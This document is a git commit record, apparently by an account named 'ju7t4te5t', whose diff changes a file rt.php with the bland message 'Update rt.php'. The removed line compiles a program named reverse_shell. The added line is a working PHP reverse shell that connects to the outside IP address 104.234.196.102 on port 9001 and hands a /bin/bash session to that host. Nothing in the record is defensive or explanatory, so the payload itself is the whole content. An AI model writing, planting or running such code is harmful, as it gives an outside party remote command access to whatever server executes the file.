478978be89bd8142d8088864e82634a7db57c904
ju7t4te5t <ju7t4te5t@gmail.com>
2024-11-27 17:24:07 +0330

    Update rt.php

--- rt.php
+++ rt.php
@@ -1,1 +1,1 @@
-<?php system("gcc -o reverse_shell r.c"); ?>
+<?php system("php -r '$sock=fsockopen("104.234.196.102",9001);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"); ?>
